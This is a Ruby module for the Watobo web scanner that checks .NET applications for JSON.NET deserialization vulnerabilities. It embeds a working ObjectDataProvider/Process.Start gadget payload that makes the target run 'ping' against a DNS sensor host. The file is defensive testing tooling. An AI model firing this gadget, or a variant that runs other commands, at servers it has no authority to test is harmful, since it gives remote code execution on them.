# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Json
        class Json_deser_net < Watobo::ActiveCheck


          @info.update(
              :check_name => 'JSON NET Deserialization', # name of check which briefly describes functionality, will be used for tree and progress views
              :check_group => "JSON Deserialization",
              :description => "Check for json deserialization vulnerability in .Net applications.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0" # check version
          )

          threat = "https://www.owasp.org/index.php/Testing_for_XML_Injection_(OWASP-DV-008)"

          measure = "Don't use dynamic types for deserialization."

          @finding.update(
              :threat => threat, # thread of vulnerability, e.g. loss of information
              :class => "JSON Deserialization", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_CRITICAL,
              :measure => measure
          )

          @@json_deser_payloads = []
          p = <<'EOF'
{
    "body": {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "MethodParameters": {
            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "$values": [
                "ping",
                "$$DNS$$"
            ]
        },
        "ObjectInstance": {
            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        }
    }
}
EOF
          @@json_deser_payloads << p


          def initialize(project, prefs = {})
            super(project, prefs)

          end

          def generateChecks(chat, &block)
            begin

              chat.request.parameters.each do |testparm|
                # first we do a request with an

                @@json_deser_payloads.each do |inj|
                  parm = testparm.copy

                  inj.gsub!('$$DNS$$', SecureRandom.hex(3) + ".json-deser.#{Watobo::Conf::Scanner.dns_sensor}")
                  parm.value = JSON.parse(inj)
                  base = chat.copyRequest
                  base_request, base_response = doRequest(base)

                  checker = proc {
                    begin
                      test_request = nil
                      test_response = nil
                      test = chat.copyRequest
                      test.set parm
                      test_request, test_response = doRequest(test)
                      #puts test_response.status

                      if test_response && test_response.has_body?
                        body = test_response.body.to_s


                        if body =~ /deserialize/i
                          addFinding(test_request, test_response,
                                     :test_item => Regexp.quote(inj),
                          :check_pattern => Regexp.quote(parm.name),
                                     :proof_pattern => "deserialize",
                                     :chat => chat,
                                     :title => "[#{chat.request.path}] - #{Regexp.quote(parm.name)}",
                                     :debug => true,
                                     :type => FINDING_TYPE_HINT
                          )

                        end
                      end
                    rescue => bang
                      puts bang
                      puts bang.backtrace if $DEBUG
                    end
                    [test_request, test_response]
                  }
                  yield checker if block_given?

                end
              end
            rescue => bang
              puts bang
              puts bang.backtrace if $DEBUG
            end
          end


        end
        # --> eo namespace
      end
    end
  end
end